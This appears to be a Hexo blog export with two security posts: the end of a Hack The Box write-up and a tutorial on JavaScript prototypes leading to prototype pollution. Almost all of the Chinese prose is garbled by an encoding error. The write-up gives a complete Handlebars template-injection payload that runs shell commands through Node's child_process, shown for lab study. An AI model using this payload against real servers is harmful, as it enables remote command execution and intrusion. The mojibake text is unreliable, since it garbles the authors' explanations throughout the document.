<li><p>å½“æˆ‘ä»¬ä½¿ç”¨æ¥è‡ª HackTricks çš„æœ‰æ•ˆè´Ÿè½½æ¥å°è¯•è¿è¡Œç³»ç»Ÿå‘½ä»¤æ—¶ï¼Œæˆ‘ä»¬ä¼šæ”¶åˆ°é”™è¯¯ã€‚å“åº”é”™è¯¯ä¸­çš„â€œæœªå®šä¹‰â€æ˜¯ä»€ä¹ˆï¼Ÿ:<code>require</code></p>
</li>
<li><p>Node.JS ä¸­é¡¶çº§ä½œç”¨åŸŸçš„åç§°æ˜¯ä»€ä¹ˆå˜é‡ï¼Ÿ:<code>Global</code></p>
</li>
<li><p>é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œæˆ‘ä»¬ä»¥è¿è¡Œ Web æœåŠ¡å™¨çš„ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚è¯¥ç”¨æˆ·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ:<code>root</code></p>
</li>
</ol>
</blockquote>
<h3 id="è¿‡ç¨‹-11"><a href="#è¿‡ç¨‹-11" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>å…ˆåœ¨HackTricksæŸ¥çœ‹handlebarsæ¨¡æ¿å¼•æ“æ³¨å…¥payloadæ¨¡æ¿</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> <span class="string">&quot;s&quot;</span> <span class="keyword">as</span> |string|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> <span class="string">&quot;e&quot;</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> split <span class="keyword">as</span> |conslist|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> (<span class="name"><span class="built_in">lookup</span></span> string.sub <span class="string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> string.split <span class="keyword">as</span> |codelist|&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-variable">&#123;&#123;<span class="name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">each</span></span> conslist&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">          </span><span class="template-tag">&#123;&#123;#<span class="name"><span class="built_in">with</span></span> (<span class="name">string.sub.apply</span> <span class="number">0</span> codelist)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">            </span><span class="template-variable">&#123;&#123;<span class="name">this</span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">          </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">each</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  </span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;&#123;/<span class="name"><span class="built_in">with</span></span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å…³é”®ä»£ç ä¸º</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">this.push</span> <span class="string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h4><p>è¿™æ˜¯å…³é”®ï¼Œå› ä¸ºåªæœ‰å¯¹ç‰¹æ®Šå­—ç¬¦ç¼–ç åï¼Œç½‘ç«™æ‰èƒ½æ­£å¸¸è¯†åˆ«</p>
<h3 id="ä¿®æ”¹payload"><a href="#ä¿®æ”¹payload" class="headerlink" title="ä¿®æ”¹payload"></a>ä¿®æ”¹payload</h3><p>å¦‚æœç›´æ¥ä½¿ç”¨è¿™ä¸ªæ¨¡æ¿payloadä¼šå‘ç”ŸæŠ¥é”™</p>
<h3 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h3><h5 id="Process-MainModule-å±æ€§"><a href="#Process-MainModule-å±æ€§" class="headerlink" title="Process.MainModule å±æ€§"></a>Process.MainModule å±æ€§</h5><blockquote>
<p><code>è·å–å…³è”è¿›ç¨‹çš„ä¸»æ¨¡å—</code></p>
</blockquote>
<h5 id="child-processæ¨¡å—"><a href="#child-processæ¨¡å—" class="headerlink" title="child_processæ¨¡å—"></a>child_processæ¨¡å—</h5><blockquote>
<p><a href="http://nodejs.org/api/child_process.html"><code>child_process</code>æ¨¡å—</a>å……å½“ <a href="http://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options"><code>spawn</code></a>ã€<a href="http://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code>execã€execFile</code></a> å’Œ <a href="http://nodejs.org/api/child_process.html#child_process_child_process_fork_modulepath_args_options"><code>fork</code></a> å‡½æ•°çš„å‘½åç©ºé—´ã€‚ </p>
<p>è°ƒç”¨ä»¥å¼•ç”¨æ¨¡å—ï¼Œç„¶åè°ƒç”¨å…¶æˆå‘˜å‡½æ•°ä¹‹ä¸€ä»¥åˆ›å»ºæ–°è¿›ç¨‹ã€‚</p>
<p><code>å°±æ˜¯åœ¨å½“å‰ä¸»è¿›ç¨‹å¼€ä¸€ä¸ªå­è¿›ç¨‹ç”¨äºshellå‘½ä»¤æ‰§è¡Œ</code></p>
</blockquote>
<h1 id="ç¬¬2å±‚"><a href="#ç¬¬2å±‚" class="headerlink" title="ç¬¬2å±‚"></a>ç¬¬2å±‚</h1>]]></content>
      <categories>
        <category>Hack the Box</category>
      </categories>
      <tags>
        <tag>htb</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(åŸå‹é“¾æ±¡æŸ“)æ·±å…¥</title>
    <url>//post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/</url>
    <content><![CDATA[<p><code>æœ¬æ¥æƒ³å°†pç¥çš„JavaScriptæ±¡æŸ“é“¾æ–‡ç« å¹¶åœ¨æˆ‘å†™çš„åŸºç¡€æµ…å…¥é‡Œï¼Œä½†æ˜¯æ„Ÿè§‰è¿˜æ˜¯å¾—åˆ†å¼€å­¦ä¹ è®°å½•ï¼Œpç¥å¹²è´§è¿˜å¾—å’Œæˆ‘æ°´çš„æ–‡ç« åˆ†å¼€ï¼Œæµ…å…¥å°±è®²æ¦‚å¿µç†è§£å­¦ä¹ å§ï¼Œæ·±å…¥å°±æ¶‰åŠæ·±å…¥è®¤è¯†æ±¡æŸ“äº†</code></p>
<span id="more"></span>

<h1 id="prototypeå’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ"><a href="#prototypeå’Œ-proto-åˆ†åˆ«æ˜¯ä»€ä¹ˆ" class="headerlink" title="prototypeå’Œ__proto__åˆ†åˆ«æ˜¯ä»€ä¹ˆ"></a><code>prototype</code>å’Œ<code>__proto__</code>åˆ†åˆ«æ˜¯ä»€ä¹ˆ</h1><blockquote>
<p>è¿™é‡Œå¼•ç”¨pç¥çš„æ–‡ç« ï¼ŒåŠ ä¸Šéƒ¨åˆ†è‡ªå·±çš„ç†è§£</p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p>
</blockquote>
<h2 id="ç†è§£"><a href="#ç†è§£" class="headerlink" title="ç†è§£"></a>ç†è§£</h2><p>åœ¨JavaScriptä¸­ï¼Œæˆ‘ä»¬å¦‚æœè¦å®šä¹‰ä¸€ä¸ªç±»ï¼Œéœ€è¦ä»¥<u>å®šä¹‰<code>â€œæ„é€ å‡½æ•°â€</code>çš„æ–¹å¼å®šä¹‰</u>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901135415750.png" alt="image-20230901135415750"></p>
<p>å…¶ä¸­<code>Fooå‡½æ•°</code>å°±æ˜¯<code>Fooç±»</code>çš„æ„é€ å‡½æ•°ï¼Œå…¶ä¸­çš„<code>this.bar</code>æ˜¯<code>Fooç±»</code>ä¸­çš„ä¸€ä¸ªå±æ€§ã€‚</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901154849363.png" alt="image-20230901154849363"></p>
<blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´<code>åˆ©ç”¨functionå®šä¹‰ç±»</code>çš„åŒæ—¶ï¼Œæ„é€ å‡½æ•°ä¹Ÿè¢«å®šä¹‰å¥½äº†</p>
</blockquote>
<blockquote>
<p>åœ¨ES6ä¸­å¼•å…¥äº†<code>class</code>çš„æ¦‚å¿µï¼Œä¸¤è€…æ˜¯æœ‰åŒºåˆ«ï¼Œä½†æ˜¯ä¸æ˜¯å¾ˆå¤§</p>
<p><code>class</code>æœ¬è´¨è¿˜æ˜¯åŸºäºåŸå‹<code>prototype</code>çš„å®ç°æ–¹å¼è¿›ä¸€æ­¥çš„å°è£…ï¼Œ<code>class</code>æœ¬è´¨è¿˜æ˜¯å‡½æ•°<code>function</code></p>
<p>ä½†æ˜¯ä½¿ç”¨<code>class</code>å®šä¹‰ç±»æ¯”<code>function</code>ä½¿å¾—ä»£ç <code>æ›´åŠ ç›´è§‚ï¼Œä¹Ÿæ›´åŠ çµæ´»</code>ï¼Œå› ä¸ºclasså®šä¹‰ç±»æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>constructor()</code>æ–¹æ³•æ¥å®šä¹‰<code>æ„é€ å‡½æ•°</code>ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨å…³é”®å­—<code>extends</code>æ¥ç»§æ‰¿çˆ¶ç±»</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901155300768.png" alt="image-20230901155300768"></p>
<blockquote>
<p>å¯ä»¥çœ‹åˆ°ç”¨classå®šä¹‰ç±»çš„æ—¶å€™ï¼Œæ„é€ å‡½æ•°ä¹Ÿæ˜¯è¢«å®šä¹‰å¥½äº†</p>
</blockquote>
<p>å¹¶ä¸”functionå’Œclassä¸¤è€…çš„æ„é€ å‡½æ•°çš„åå­—ä¹Ÿæ˜¯ä¸€æ ·çš„</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901160722382.png" alt="image-20230901160722382"></p>
<hr>
<p>åœ¨ä¸€ä¸ªç±»å¿…ç„¶æœ‰ä¸€äº›æ–¹æ³•ï¼Œç±»ä¼¼å±æ€§<code>this.bar</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°çš„å†…éƒ¨</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>show</code>çš„å®šä¹‰åˆ©ç”¨äº†<code>function</code>ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¢«å®šä¹‰ä¸º<code>showç±»</code>ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªshowæ–¹æ³•å¹¶ä¸æ˜¯å’Œä¸Šé¢ä¸€æ ·æ˜¯æ‰€è°“<code>showç±»</code>çš„æ„é€ å‡½æ•°ï¼Œè€Œæ˜¯<code>Fooç±»</code>ä¸­<code>Foo</code>è¿™ä¸ªæ„é€ å‡½æ•°çš„ä¸€ä¸ªæ–¹æ³•</p>
<p>å¦‚ä¸‹å›¾ç»“æœå¯ä»¥ç†è§£ï¼Œåœ¨æ–°å»ºå®ä¾‹åŒ–Fooå¯¹è±¡ï¼Œæ‰§è¡Œæ„é€ å‡½æ•°æ—¶ï¼Œ<code>show</code>æ–¹æ³•ä¹Ÿä¼šè¢«æ‰§è¡Œå¯çŸ¥ï¼Œ<code>show</code>åªæ˜¯æ„é€ å‡½æ•°ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæ˜¯ç»‘å®šåœ¨å¯¹è±¡ä¸­çš„å—ï¼Œè€Œä¸æ˜¯ç»‘å®šåœ¨ç±»</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901150808861.png" alt="image-20230901150808861"></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170534691.png" alt="image-20230901170534691"></p>
<p>ä½†ç”±æ­¤å‡ºç°äº†ä¸€ä¸ªæ–°é—®é¢˜ï¼Œé‚£å¦‚æœæ¯æ¬¡<code>æ–°å»ºä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡å°±æ‰§è¡Œä¸€æ¬¡showæ–¹æ³•</code>ï¼Œæœ‰æ—¶åœ¨å®é™…ç”Ÿäº§ä¸­å¹¶ä¸éœ€è¦ï¼Œå¯èƒ½å¤§å¤šæ•°æ—¶å€™<code>åªæƒ³åœ¨åˆ›å»ºç±»åæ‰§è¡Œä¸€æ¬¡</code>å³å¯</p>
<p>é‚£è‚¯å®šå°±ä¸èƒ½æŠŠ<code>show</code>æ–¹æ³•å†å†™åˆ°<code>function Foo&#123;&#125;</code>ä¸­å»äº†ï¼Œ</p>
<blockquote>
<p>è¿™é‡Œå°±éœ€è¦ä½¿ç”¨åŸå‹<code>prototype</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç å…¶å®ä¹Ÿå¥½ç†è§£ï¼Œæˆ‘ä»¬å°†<code>show</code>æ–¹æ³•å•ç‹¬æå‡ºæ¥å½“ä½œä¸€ä¸ªå‡½æ•°ï¼Œå¹¶åŠ åˆ°<code>Foo</code>çš„åŸå‹å½“ä½œä¸€ä¸ªå•ç‹¬çš„å‡½æ•°ï¼Œ<code>prototype</code>å¯ä»¥å½“ä½œ<code>Foo</code>ç±»è‡ªå¸¦çš„ä¸€ä¸ªå±æ€§ï¼Œæ‰€æœ‰çš„åˆ›å»ºçš„<code>Foo</code>å¯¹è±¡éƒ½å°†æ‹¥æœ‰<code>Foo</code>ç±»ä¸­æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170427183.png" alt="image-20230901170427183"></p>
<p>å¯ä»¥çœ‹åˆ°å’Œåœ¨æ„é€ å‡½æ•°ä¸­å®šä¹‰<code>show</code>ä¸åŒçš„æ˜¯ï¼Œ<code>show</code>ä½œä¸ºå’Œæ„é€ å‡½æ•°ä¸€æ ·çš„æ˜¾ç¤ºåœ¨åŸå‹å†…å®¹ä¸­ï¼Œå±äºæ˜¯æ–°åˆ›å»ºçš„<code>Foo</code>ç±»å¯¹è±¡å¯ä»¥åˆ©ç”¨çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901171115585.png" alt="image-20230901171115585"></p>
<p>è¿™é‡Œå°†<code>Foo</code>ç±»å®ä¾‹åŒ–åç»™<code>foo</code>ï¼Œ<code>foo</code>ä¹Ÿå®Œå…¨å¯ä»¥ç›´æ¥è°ƒç”¨<code>show</code>å‡½æ•°çš„å†…å®¹ï¼Œ<code>foo</code>è‡ªèº«åˆ›å»ºå¼€å§‹å°±å…·æœ‰<code>Foo</code>ä¸­çš„æ‰€æœ‰å˜é‡æ–¹æ³•å¯ä»¥è°ƒç”¨ã€‚</p>
<hr>
<h2 id="å…³é”®ç‚¹"><a href="#å…³é”®ç‚¹" class="headerlink" title="å…³é”®ç‚¹"></a>å…³é”®ç‚¹</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Foo.prototype</code>æ¥è®¿é—®<code>Foo</code>ç±»çš„åŸå‹ï¼Œä½†æ˜¯<code>Foo</code>ç±»å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œå¦‚ä¸Šçš„<code>foo</code>ï¼Œæ˜¯ä¸èƒ½ç›´æ¥è°ƒç”¨<code>prototype</code>è¿›è¡Œè®¿é—®åŸå‹çš„</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172350796.png" alt="image-20230901172350796"></p>
<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦æåˆ°<code>__proto__</code>ï¼Œç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å¯ä»¥é€šè¿‡<code>__proto__</code>æ¥ç›´æ¥è®¿é—®ç±»çš„åŸå‹ã€‚</p>
<p>ä¹Ÿå°±æ˜¯</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span> == <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172719167.png" alt="image-20230901172719167"></p>
<p>è¿›ä¸€æ­¥æ€è€ƒï¼Œä¹Ÿå°±æ˜¯å®ä¾‹åŒ–åçš„å¯¹è±¡ã€[æ¯”å¦‚<code>foo</code>]å¯ä»¥åƒä¸Šé¢ä¾‹å­ä¸€æ ·ï¼Œé€šè¿‡<code>__proto__</code>è®¿é—®åŸå‹å®šä¹‰ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå¦‚ä¸‹ä¾‹å­ï¼Œåˆ©ç”¨<code>foo.__proto__</code>å®šä¹‰äº†ä¸€ä¸ªæ–°å‡½æ•°<code>hacker</code></p>
<p>å¹¶ä¸”èƒ½æˆåŠŸè°ƒç”¨æ‰§è¡Œï¼Œæ‰“å°â€™<code>i get shell</code>â€˜</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span>.<span class="property">hacker</span> = <span class="keyword">function</span> <span class="title function_">hacker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i get shell&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182724283.png" alt="image-20230901182724283"></p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182756972.png" alt="image-20230901182756972"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><blockquote>
<ol>
<li><code>prototype</code>æ˜¯ä¸€ä¸ª<code>ç±»çš„å±æ€§</code>ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li>
<li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li>
</ol>
</blockquote>
<h1 id="JavaScriptåŸå‹é“¾ç»§æ‰¿"><a href="#JavaScriptåŸå‹é“¾ç»§æ‰¿" class="headerlink" title="JavaScriptåŸå‹é“¾ç»§æ‰¿"></a>JavaScriptåŸå‹é“¾ç»§æ‰¿</h1><p>ç»§æ‰¿åœ¨javaä¸­å¾ˆå¸¸è§ï¼Œåœ¨JavaScriptä¸­ä½œç”¨ä¹Ÿå·®ä¸å¤šï¼Œåªä¸è¿‡æ¦‚å¿µè¢«æ›¿æ¢æˆåŸå‹äº†</p>
<blockquote>
<p>æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶ã€‚</p>
</blockquote>
<p>æ¯”å¦‚ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„ï¼Œ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç†è§£ä¸ºSonçš„åŸå‹ä¸ºå®ä¾‹åŒ–çš„Fatherç±»ï¼ŒSonç±»å°±ä¼šç»§æ‰¿Fatherç±»å¾—å¾—<code>last_name</code>å±æ€§ï¼Œä½†æ˜¯ç»§æ‰¿ä¸ä¼šè¦†ç›–è‡ªå·±åŸæœ‰çš„å±æ€§ï¼Œæ‰€ä»¥<code>first_name</code>è¿˜æ˜¯Sonç±»è‡ªå·±çš„</p>
<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905094854794.png" alt="image-20230905094854794"></p>
<p>ç„¶åå†å°†<code>Son</code>å®ä¾‹åŒ–ç»™<code>son</code>ï¼Œé‚£ä¹ˆ<code>son</code>å°±å…·æœ‰<code>Sonç±»</code>å’Œ<code>Fatherç±»</code>çš„æ‰€æœ‰å±æ€§</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095519407.png" alt="image-20230905095519407"></p>
<p>å¯ä»¥åœ¨è¿™é‡Œçš„å±‚æ¬¡å°±å¯ä»¥çœ‹å‡ºï¼Œ<code>son</code>çš„<code>first_name</code>æ˜¯<code>ä»¥Sonç±»ä¸ºä¸»</code>çš„ï¼Œè€Œç”±äºè‡ªèº«æ²¡æœ‰<code>last_name</code>ï¼Œå°±ä¼šä»è‡ªå·±<code>åŸå‹Fatherç±»</code>ç»§æ‰¿<code>last_name</code>ç„¶åè·å–å€¼</p>
<p>äºæ˜¯å½“æ‰“å°æ—¶ï¼Œæœ€åè¾“å‡ºçš„æ˜¯<code>Name: Melania Trump</code>ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/post/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095812582.png" alt="image-20230905095812582"></p>
